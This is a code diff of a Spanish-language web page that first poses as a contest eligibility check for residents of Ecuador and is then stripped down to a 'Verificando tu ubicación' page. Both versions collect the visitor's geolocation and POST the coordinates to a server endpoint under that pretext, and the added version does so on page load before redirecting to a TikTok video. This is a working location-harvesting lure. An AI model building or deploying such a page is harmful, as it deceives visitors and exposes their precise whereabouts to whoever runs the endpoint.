@@ -1,118 +1,49 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Verificar Participante - Concurso</title>
-  <style>
-    body { font-family: Inter, Arial, sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; background:#f5f7fb; }
-    .card { background:#fff; padding:28px; border-radius:12px; box-shadow:0 8px 30px rgba(20,20,40,0.08); width:360px; text-align:center; }
-    h1 { margin:0 0 12px; font-size:20px; }
-    p { color:#555; font-size:14px; margin-bottom:18px; }
-    button { background:#1877F2; color:white; border:none; padding:12px 18px; border-radius:10px; cursor:pointer; font-size:16px; }
-    button.secondary { background:#e0e6f0; color:#132; margin-left:8px; }
-    .small { font-size:13px; color:#888; margin-top:12px; }
-    .error { color:#b00020; margin-top:12px; }
-  </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificar Ubicación</title>
 </head>
 <body>
-  <div class="card">
-    <h1>Verifica tu ubicación</h1>
-    <p>Para participar en el concurso debemos asegurarnos de que residas en Ecuador. Pulsa <strong>Permitir</strong> .</p>
-    <div>
-      <button id="allowBtn">Permitir</button>
-      <button id="noBtn" class="secondary">No participar</button>
-    </div>
-    <div id="msg" class="small" aria-live="polite"></div>
-    <div id="err" class="error" aria-live="polite"></div>
-  </div>
+  <h1>Verificando tu ubicación...</h1>
 
   <script>
-    // URL a la que redirigir si está en Ecuador:
-    const CONCURSO_URL = "https://www.tiktok.com/@nuevaera2010/video/7091080509635284229"; // <- cambia esto
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
 
-    // Cajas geográficas aproximadas para Ecuador (península + Galápagos)
-    // Mainland Ecuador:
-    const MAINLAND = {
-      latMin: -5.1,  // sur
-      latMax: 1.9,   // norte
-      lonMin: -81.5, // oeste
-      lonMax: -75.0  // este
-    };
-    // Galápagos (aprox)
-    const GALAPAGOS = {
-      latMin: -1.8,
-      latMax: 1.2,
-      lonMin: -92.6,
-      lonMax: -88.4
-    };
+          console.log("Ubicación obtenida:", lat, lon);
 
-    const msg = document.getElementById('msg');
-    const err = document.getElementById('err');
-    const allowBtn = document.getElementById('allowBtn');
-    const noBtn = document.getElementById('noBtn');
+          // Enviar las coordenadas al endpoint en Vercel
+          try {
+            const response = await fetch("/api/registrar-coordenadas", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({ lat, lon }),
+            });
 
-    function esEnEcuador(lat, lon) {
-      const inMain = lat >= MAINLAND.latMin && lat <= MAINLAND.latMax &&
-                     lon >= MAINLAND.lonMin && lon <= MAINLAND.lonMax;
-      const inGal = lat >= GALAPAGOS.latMin && lat <= GALAPAGOS.latMax &&
-                    lon >= GALAPAGOS.lonMin && lon <= GALAPAGOS.lonMax;
-      return inMain || inGal;
+            const data = await response.json();
+            console.log("Respuesta del servidor:", data);
+
+            // Redirigir al usuario al enlace de TikTok
+            window.location.href = "https://www.tiktok.com/@nuevaera2010/video/7091080509635284229";
+          } catch (error) {
+            console.error("Error al enviar coordenadas:", error);
+          }
+        },
+        (error) => {
+          console.error("Error al obtener ubicación:", error.message);
+          alert("No se pudo obtener tu ubicación. Por favor permite el acceso.");
+        }
+      );
+    } else {
+      alert("Tu navegador no soporta geolocalización.");
     }
-
-    function manejarErrorGeoloc(error) {
-      switch(error.code) {
-        case error.PERMISSION_DENIED:
-          err.textContent = "Has denegado el acceso a la ubicación. No puedes participar sin verificar ubicación.";
-          break;
-        case error.POSITION_UNAVAILABLE:
-          err.textContent = "No se pudo obtener tu ubicación. Inténtalo nuevamente o revisa la configuración de tu dispositivo.";
-          break;
-        case error.TIMEOUT:
-          err.textContent = "Tiempo de espera agotado para obtener la ubicación. Inténtalo otra vez.";
-          break;
-        default:
-          err.textContent = "Error desconocido al obtener ubicación.";
-      }
-      msg.textContent = "";
-    }
-
-    allowBtn.addEventListener('click', () => {
-      err.textContent = "";
-      msg.textContent = "Solicitando ubicación... por favor acepta el permiso en tu navegador.";
-      if (!navigator.geolocation) {
-        err.textContent = "Tu navegador no soporta Geolocalización.";
-        msg.textContent = "";
-        return;
-      }
-      navigator.geolocation.getCurrentPosition(position => {
-  const lat = position.coords.latitude;
-  const lon = position.coords.longitude;
-  msg.textContent = `Coordenadas obtenidas: ${lat.toFixed(5)}, ${lon.toFixed(5)}. Verificando...`;
-
-  // Enviar coordenadas al endpoint
-  fetch('/api/registrar-coordenadas', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ lat, lon })
-  })
-  .then(res => res.json())
-  .then(data => console.log(data))
-  .catch(err => console.error('Error al enviar coordenadas:', err));
-
-  if (esEnEcuador(lat, lon)) {
-    msg.textContent = "Ubicación validada: participante en Ecuador. Redirigiendo al concurso...";
-    setTimeout(() => { window.location.href = CONCURSO_URL; }, 900);
-  } else {
-    err.textContent = "Lo sentimos, tu ubicación no corresponde a Ecuador. No puedes participar.";
-    msg.textContent = "";
-  }
-}, manejarErrorGeoloc, { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 });
-
-    noBtn.addEventListener('click', () => {
-      msg.textContent = "Has decidido no participar. Gracias por visitar.";
-      err.textContent = "";
-    });
   </script>
 </body>
 </html>
